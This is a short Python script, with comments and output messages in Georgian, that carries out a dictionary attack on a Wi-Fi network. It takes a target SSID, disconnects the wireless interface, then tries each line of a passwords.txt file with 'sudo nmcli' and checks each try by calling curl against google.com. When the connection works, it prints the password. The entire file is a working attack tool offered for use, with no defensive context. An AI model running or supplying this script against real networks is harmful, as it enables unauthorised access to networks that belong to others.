# მუშაობს მარა ნელა

from os import system
counteri = 0

ssid = input("enter ssid: ")
status = system("nmcli d disconnect wlan0")
system("ifconfig wlan0 up")


with open("passwords.txt") as pass_file:
    for each_password in pass_file:
        system(f"sudo nmcli d wifi connect {ssid} password {each_password} ifname wlan0")
        ping = system("curl -I -N https://google.com")
        if ping == 0:
            print(f"დაუკავშირდა {ssid}-ს {each_password}")
            break
        else:
            print(f"{each_password}-მა ჩაიკუკა")
            counteri += 1
            print(f'ხაზი ნომერი - {counteri}')
